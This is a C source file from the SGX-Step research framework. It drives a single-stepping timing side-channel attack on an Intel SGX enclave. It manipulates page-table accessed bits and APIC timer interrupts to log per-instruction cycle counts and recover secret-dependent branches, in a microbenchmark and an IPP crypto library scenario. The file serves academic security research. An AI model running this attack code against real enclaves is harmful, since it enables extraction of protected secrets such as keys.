/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

/* Modified by Ivan Puddu <ivan.puddu@inf.ethz.ch> on 20.02.2020 */

/* Note that this define is required for syscalls to work. */
#define _GNU_SOURCE 1

#include <linux/random.h>
#include <sys/syscall.h>
#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/config.h"

#ifndef NUM_RUNS
#define NUM_RUNS 100
#endif

#ifndef NUM_INSTR
#define NUM_INSTR 25
#endif

#ifndef BIN_NUM_LEN
#define BIN_NUM_LEN 32
#endif

#define MICROBENCH 1
#define IPP_LIB 4
#ifndef ATTACK_SCENARIO
#define ATTACK_SCENARIO MICROBENCH
#endif

sgx_enclave_id_t eid = 0;
int strlen_nb_access = 0;
int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
uint64_t *pte_encl = NULL;
uint64_t *pte_str_encl = NULL;

uint8_t *do_cnt_instr; // shared variable. If this is 1 we start measuring
uint8_t do_cnt_instr_old = 0;

typedef struct measurement_t
{
    uint64_t cycles;
    // uint32_t page_nr;
    uint8_t accessed;
    uint8_t do_count;
} measurement_t;
measurement_t *log_arr;
size_t log_arr_size;
size_t cur_measurement_index;

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
uint64_t aep_cb_func(void)
{
    uint8_t cnt_instr;
    // uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
    // info("hello, irq=%d, accessed=%d, do_cnt_instr=%d", irq_cnt, ACCESSED(*pte_encl), *do_cnt_instr);
    // info("^^ enclave RIP=%#llx; ACCESSED=%d, do_cnt_instr=%d", erip, ACCESSED(*pte_encl), *do_cnt_instr);
    irq_cnt++;

    if ( __builtin_expect(do_irq && (irq_cnt > NUM_RUNS * 500), 0) ) {
        info("excessive interrupt rate detected (try adjusting timer interval "
             "to avoid getting stuck in zero-stepping); aborting...");
        do_irq = 0;
    }

    // This condition excludes the first mov that sets the do_cnt_instr, but includes the one that sets it to 0
    cnt_instr = do_cnt_instr_old;
    do_cnt_instr_old = *do_cnt_instr;

    // check if we should measure this instruction
    if ( __builtin_expect(cnt_instr, 1) )
    {
        uint64_t cycles = nemesis_tsc_aex - nemesis_tsc_eresume;
        log_arr[cur_measurement_index] = (measurement_t){cycles, ACCESSED(*pte_encl), *do_cnt_instr};
        cur_measurement_index += ACCESSED(*pte_encl);
    }

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
    if (__builtin_expect(do_irq, 1))
    {
       /*
        * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
        * referencing the enclave code page about to be executed, so as to be able
        * to filter out "zero-step" results that won't set the accessed bit.
        */
        *pte_encl = MARK_NOT_ACCESSED(*pte_encl);

        __asm__ __volatile__(
            "prefetcht0 sgx_step_aep_trampoline(%%rip)\n\t"
            :::
        );

        // Make sure currently used page is prefetched
        // (usually this is the case anyways)
        // Note: Prefetching next page is a bad idea, since this sometimes
        // evicts data used by the enclave which creates double peaks.
        __asm__ __volatile__(
            "prefetcht0 pte_encl(%%rip)\n\t"
            :::
        );

        // The value returned by this function will be set as the APIC counter
        return SGX_STEP_TIMER_INTERVAL;
    }
    return 0;
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal)
{
    info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
    ASSERT(fault_cnt++ < 10);

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

int irq_count = 0;

void irq_handler(uint8_t *rsp)
{
    uint64_t *p = (uint64_t *)rsp;
#if 0
    printf("\n");
    info("****** hello world from user space IRQ handler with count=%d ******",
        irq_count++);

    info("APIC TPR/PPR is %d/%d", apic_read(APIC_TPR), apic_read(APIC_PPR));
    info("RSP at %p", rsp);
    info("RIP is %p", *p++);
    info("CS is %p", *p++);
    info("EFLAGS is %p", *p++);
#endif
}

/* ================== ATTACKER INIT/SETUP ================= */

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();

    if (isatty(fileno(stdout)))
    {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    void *code_adrs;
    
    #if (ATTACK_SCENARIO == MICROBENCH)
        SGX_ASSERT(get_asm_secret_branch_adrs(eid, &code_adrs));
    #elif (ATTACK_SCENARIO == IPP_LIB)
        SGX_ASSERT(get_asm_ipp_adrs(eid, &code_adrs));
    #endif

    //print_page_table( code_adrs );
    info("enclave trigger code adrs at %p\n", code_adrs);
    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
#if SINGLE_STEP_ENABLE
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
#endif

    //print_page_table( get_enclave_base() );
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main(int argc, char **argv)
{
    sgx_launch_token_t token = {0};
    int apic_fd, encl_strlen = 0, updated = 0;
    idt_t idt = {0};

    info_event("Creating enclave...");
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1,
                                  &token, &updated, &eid, NULL));

    /* 1. Setup attack execution environment. */
    attacker_config_runtime();
    attacker_config_page_table();

#if USER_IDT_ENABLE
    info_event("Establishing user space APIC/IDT mappings");
    map_idt(&idt);
    install_user_irq_handler(&idt, irq_handler, IRQ_VECTOR);
    //dump_idt(&idt);
    apic_timer_oneshot(IRQ_VECTOR);
#else
    info_event("Establishing user space APIC mapping (with kernel space handler)");
    apic_timer_oneshot(LOCAL_TIMER_VECTOR);
#endif

/* TODO for some reason the Dell Latitude machine first needs 2 SW IRQs
     * before the timer IRQs even fire (??) */
#if USER_IDT_ENABLE
    info_event("Triggering user space software interrupts");
    asm("int %0\n\t" ::"i"(IRQ_VECTOR)
        :);
    asm("int %0\n\t" ::"i"(IRQ_VECTOR)
        :);
#endif

    info("generating random secret");
    int secret_arr_size;
    uint8_t *secret_arr;

    secret_arr_size = NUM_RUNS;
    secret_arr = malloc(secret_arr_size);

    srand(0);
    for (int i = 0; i < secret_arr_size; i++)
    {
        secret_arr[i] = rand() % 2;
    }
    // ASSERT(syscall(SYS_getrandom, secret_arr, secret_arr_size, 0));

    info("initialize log array");
    #if (ATTACK_SCENARIO == MICROBENCH)
        log_arr_size = NUM_RUNS * (NUM_INSTR * 2 + 3);
    #elif (ATTACK_SCENARIO == IPP_LIB)
        log_arr_size = NUM_RUNS * (BIN_NUM_LEN * 5 + 6 + 11);
    #endif
    ASSERT(log_arr = (measurement_t *)calloc(log_arr_size, sizeof(measurement_t)));

    // initialize do_cnt_instr
    ASSERT(do_cnt_instr = (uint8_t *)calloc(1, sizeof(uint8_t)));
    *do_cnt_instr = 0;

    // set current measurement to 0
    cur_measurement_index = 0;

    info("secret size=%d, log size=%d", secret_arr_size, log_arr_size);

    /* 2. Single-step enclaved execution. */
    info("calling enclave: attack=%d; num_runs=%d; timer=%d",
         ATTACK_SCENARIO, NUM_RUNS, SGX_STEP_TIMER_INTERVAL);


    #if (ATTACK_SCENARIO  == MICROBENCH)
        SGX_ASSERT(do_asm_secret_branch(eid, do_cnt_instr, secret_arr, secret_arr_size));
    #elif (ATTACK_SCENARIO == IPP_LIB)
        SGX_ASSERT(do_asm_ipp(eid, do_cnt_instr, secret_arr, secret_arr_size, BIN_NUM_LEN));
    #endif

    /* 3. Restore normal execution environment. */
    apic_timer_deadline();
    SGX_ASSERT(sgx_destroy_enclave(eid));

    info_event("all done; counted %d IRQs", irq_cnt);

    const char* fname = "./logs/measurements.txt"; 
    const char* sname = "./logs/secrets.txt";
    FILE *sf = fopen(sname, "w");


    info("saving the measurements to %s:", fname);
    FILE *fp = fopen(fname, "w");
    fprintf(fp, "Test name: secret_branch\n");
    fprintf(fp, "Testing instruction: test \%rax, \%rax\tmov \%rcx, -8(\%rsp)\n");
    fprintf(fp, "cycles, secret\n");

    int abnormal = 0;
    #if (ATTACK_SCENARIO == MICROBENCH)
    size_t secret_ctr = 0;
    int old_i = 0;
    int num_per_run = 0;
    for (int i = 0; secret_ctr < NUM_RUNS; i++) {
        if (log_arr[i].do_count == 0) {
            fprintf(sf, "%d\n", secret_arr[secret_ctr]);
            fprintf(fp, "-\n");
            if (num_per_run != 1 + NUM_INSTR * 2 + (1 - secret_arr[secret_ctr]) ) {
                abnormal++;
            }
            secret_ctr++;
            num_per_run = 0;
        } else {
            fprintf(fp, "%d, %d\n", log_arr[i].cycles, secret_arr[secret_ctr]);
            num_per_run++;
        }
    }
    #elif (ATTACK_SCENARIO == IPP_LIB)
    int old_cnt = 0;
    int secret_inx = 0;
    for (int i = 0; i < log_arr_size; i++) {
        if (log_arr[i].do_count && old_cnt) {
            fprintf(fp, "%d, %d, %d\n", log_arr[i].cycles, secret_arr[secret_inx], secret_arr[secret_inx+1]);
        }
        if (!log_arr[i].do_count && old_cnt) {
            fprintf(fp, "-\n");
            secret_inx += 2;
        }
        // increment secret
        old_cnt = log_arr[i].do_count;
    }
    #endif 
    
    fclose(sf);
    fclose(fp);
    free(log_arr);
    free(do_cnt_instr);
    free(secret_arr);

    if (abnormal) {
        error("Detected %d abnormal runs.. Try to tweak the SGX_STEP_TIMER_INTERVAL value. (Currently it's probably too high)\n", abnormal);
        return -1;
    }
    return 0;
}
